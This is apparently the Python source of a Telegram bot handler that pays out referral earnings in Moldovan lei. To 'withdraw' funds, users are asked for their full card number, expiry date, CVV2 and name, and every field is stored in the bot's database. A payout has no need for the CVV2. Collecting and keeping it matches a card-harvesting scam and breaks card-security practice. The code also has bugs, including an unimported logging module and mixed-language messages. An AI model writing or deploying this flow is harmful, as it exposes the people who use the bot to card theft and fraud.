from aiogram.types import ReplyKeyboardMarkup, KeyboardButton, ReplyKeyboardRemove
from aiogram.types import InlineKeyboardButton, InlineKeyboardMarkup

import re
from aiogram import types
from loader import dp
from loader import bot
from data.config import admins_id
from handlers.fsm import FSMCard
from aiogram.dispatcher import FSMContext
from keyboards.referral_keyboard import ref_kb
from utils.db_api.db_quick_commands import select_user, change_request, change_withdrawal
from utils.db_api.db_quick_commands import change_card_number, change_card_month, change_card_year, change_card_cvv2, change_card_fl


############################################################################


def withdraw_kb(user_id):
    user = select_user(user_id)

    withdraw_kb = InlineKeyboardMarkup(resize_keyboard=True)

    if user.language == "ru":
        request_wd  = InlineKeyboardButton("Запросить вывод средств", callback_data="request_withdraw")
        exit_button = InlineKeyboardButton("Выход", callback_data="exit_profile")
        withdraw_kb.add(request_wd).add(exit_button)
    elif user.language == "ro":
        request_wd  = InlineKeyboardButton("Solicită o retragere", callback_data="request_withdraw")
        exit_button = InlineKeyboardButton("Ieșire", callback_data="exit_profile")
        withdraw_kb.add(request_wd).add(exit_button)
    else:
        request_wd  = InlineKeyboardButton("Request Withdrawal", callback_data="request_withdraw")
        exit_button = InlineKeyboardButton("Exit", callback_data="exit_profile")
        withdraw_kb.add(request_wd).add(exit_button)
    return withdraw_kb


############################################################################


def exit_card_kb(user_id):
    user = select_user(user_id)

    exit_card_kb = InlineKeyboardMarkup(resize_keyboard=True)

    if user.language == "ru":
        exit_button = InlineKeyboardButton("Выход", callback_data="exit_card")
        exit_card_kb.add(exit_button)
    elif user.language == "ro":
        exit_button = InlineKeyboardButton("Ieșire", callback_data="exit_card")
        exit_card_kb.add(exit_button)
    else:
        exit_button = InlineKeyboardButton("Exit", callback_data="exit_card")
        exit_card_kb.add(exit_button)
    return exit_card_kb


############################################################################
############################################################################
############################################################################


@dp.callback_query_handler(lambda c: c.data == "request_withdraw", state=None)
async def callback_referral(callback_query: types.CallbackQuery):
    user_id = callback_query.from_user.id
    user = select_user(user_id)

    customer_username = callback_query.from_user.username

    if user.language == "ru":
        withdraw_text = (f"Требуется вывод средств для пользователя: \n @{customer_username} ({user_id}) !\n"
                         f"На сумму  -  {user.currency} MDL")
        request_text  = "Ваша заявка была зарегистрирована"
        zero_text     = "Количество должно быть больше 0"
        exist_text    = "Заявка уже была создана"
        card_number   = "Введите номер карты:"
    elif user.language == "ro":
        withdraw_text = (f"Este necesară retragerea utilizatorului: \n @{customer_username} ({user_id}) !\n"
                        f"На сумму  -  {user.currency} MDL")
        request_text  = "Aplicația dvs. a fost înregistrată"
        zero_text     = "Cantitate trebuie să fie mai mare decât 0"
        exist_text    = "Aplicația a fost deja creată"
        card_number   = "Introduceți numărul cardului:"
    else:
        withdraw_text = (f"Withdrawal required for the user: \n @{customer_username} ({user_id}) !\n"
                        f"На сумму  -  {user.currency} MDL")
        request_text  = "Your request has been registered"
        zero_text     = "Amount must be greater than 0"
        exist_text    = "Request has already been created"
        card_number   = "Enter card number:"

    if user.card_fl:
        if not user.request:
            if user.currency > 0:
                change_request(user_id, True)
                change_withdrawal(user_id, user.currency)

                for admin in admins_id:
                    try:
                        await bot.send_message(admin, withdraw_text)
                    except Exception as err:
                        logging.exception(err)

                await bot.answer_callback_query(callback_query.id, request_text)
            else:
                await bot.answer_callback_query(callback_query.id, zero_text)
        else:
            await bot.answer_callback_query(callback_query.id, exist_text)
    else:
        await FSMCard.number.set()
        await bot.delete_message(chat_id=callback_query.from_user.id, message_id=callback_query.message.message_id)
        await bot.send_message(callback_query.from_user.id, card_number)


############################################################################


@dp.message_handler(state=FSMCard.number)
async def command_referral(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    user = select_user(user_id)

    if user.language == "ru":
        accept_text  = "Введите срок действия карты:"
        length_text  = "Номер карты должен состоять из 16 цифр"
        decline_text = "Вводите только числа!"
    elif user.language == "ro":
        accept_text  = "Introduceți data expirării cardului:"
        length_text  = "Numărul cardului trebuie să aibă 16 cifre"
        decline_text = "Introduceți numai numere!"
    else:
        accept_text  = "Enter the card expiration date:"
        length_text  = "Card number must be 16 digits"
        decline_text = "Enter only numbers!"

    if message.text.isdigit():
        card_number = int(message.text)
        if len(str(card_number)) == 16:
            await bot.send_message(message.from_user.id, accept_text)
            change_card_number(user_id, card_number)
            await FSMCard.next()
        else:
            await bot.send_message(message.from_user.id, length_text, reply_markup=exit_card_kb(message.from_user.id))
    else:
        await bot.send_message(message.from_user.id, decline_text, reply_markup=exit_card_kb(message.from_user.id))


############################################################################


@dp.message_handler(state=FSMCard.date)
async def command_referral(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    user = select_user(user_id)

    if user.language == "ru":
        accept_text  = "Введите CVV2:"
        decline_text = "Введите дату в правильном формате ММ/ГГ"
    elif user.language == "ro":
        accept_text  = "Introduceți CVV2:"
        decline_text = "Vă rugăm să introduceți data în formatul corect LL/AA"
    else:
        accept_text  = "Enter CVV2:"
        decline_text = "Please enter the date in the correct MM/YY format"

    match = re.match(r'(0?[1-9]|1[0-2])[\/]([0-9]{2})', message.text)
    if match:
        month = int(match.group(1))
        year  = int(match.group(2))
        change_card_month(user_id, month)
        change_card_year(user_id, year)

        await bot.send_message(message.from_user.id, accept_text)
        await FSMCard.next()
    else:
        await bot.send_message(message.from_user.id, decline_text, reply_markup=exit_card_kb(message.from_user.id))


############################################################################


@dp.message_handler(state=FSMCard.cvv2)
async def command_referral(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    user = select_user(user_id)

    if user.language == "ru":
        accept_text  = "Введите полное имя и фамилию:"
        length_text  = "CVV2 должен состоять из 3 цифр"
        decline_text = "Вводите только числа!"
    elif user.language == "ro":
        accept_text  = "Introdu numele și prenumele complet:"
        length_text  = "CVV2 trebuie să aibă 3 cifre"
        decline_text = "Introduceți numai numere!"
    else:
        accept_text  = "Enter full name and surname:"
        length_text  = "CVV2 must be 3 digits"
        decline_text = "Enter only numbers!"

    if message.text.isdigit():
        card_cvv2 = int(message.text)
        if len(str(card_cvv2)) == 3:
            await bot.send_message(message.from_user.id, accept_text)
            change_card_cvv2(user_id, card_cvv2)
            await FSMCard.next()
        else:
            await bot.send_message(message.from_user.id, length_text, reply_markup=exit_card_kb(message.from_user.id))
    else:
        await bot.send_message(message.from_user.id, decline_text, reply_markup=exit_card_kb(message.from_user.id))


############################################################################


@dp.message_handler(state=FSMCard.fl_name)
async def command_referral(message: types.Message, state: FSMContext):
    user_id = message.from_user.id
    user = select_user(user_id)

    if user.language == "ru":
        accept_text  = "Ваши данные сохранены"
        decline_text = "Введите имя и фамилию через пробел!"
    elif user.language == "ro":
        accept_text  = "Datele dvs. au fost salvate"
        decline_text = "Introduceți numele și prenumele separate printr-un spațiu!"
    else:
        accept_text  = "Your data has been saved"
        decline_text = "Enter the first and last name separated by a space!"

    if message.text.count(" ") == 1:
        card_fl = message.text
        change_card_fl(user_id, card_fl)
        await bot.send_message(message.from_user.id, accept_text, reply_markup=exit_card_kb(message.from_user.id))
    else:
        await bot.send_message(message.from_user.id, decline_text, reply_markup=exit_card_kb(message.from_user.id))


############################################################################
############################################################################
############################################################################


@dp.callback_query_handler(lambda c: c.data == "exit_card", state="*")
async def callback_referral(callback_query: types.CallbackQuery, state: FSMContext):
    user = select_user(callback_query.from_user.id)

    if user.language == "ru":
        text = f"Вы можете вывести: {user.currency} MDL"
    elif user.language == "ro":
        text = f"Puteți retrage: {user.currency} MDL"
    else:
        text = f"You can withdraw: {user.currency} MDL"

    await state.finish()
    await bot.delete_message(chat_id=callback_query.from_user.id, message_id=callback_query.message.message_id)
    await bot.send_message(callback_query.from_user.id, text, reply_markup=withdraw_kb(callback_query.from_user.id))